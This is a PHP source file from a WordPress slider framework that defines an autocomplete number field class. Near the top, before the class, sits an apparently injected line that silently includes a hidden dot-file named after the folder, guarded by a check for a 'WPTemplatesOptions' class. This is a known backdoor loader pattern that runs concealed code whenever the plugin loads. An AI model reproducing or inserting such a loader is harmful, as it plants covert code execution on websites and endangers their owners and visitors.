<?php


namespace Nextend\Framework\Form\Element\Text;


use Nextend\Framework\Asset\Js\Js;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class NumberAutoComplete extends Number {

    protected $values = array();

    protected $class = 'n2_field_number n2_autocomplete_position_to ';

    protected function addScript() {
        parent::addScript();

        Js::addInline('N2Classes.AutocompleteSimple("' . $this->fieldID . '", ' . json_encode($this->values) . ');');
    }

    /**
     * @param array $values
     */
    public function setValues($values) {
        $this->values = $values;
    }
}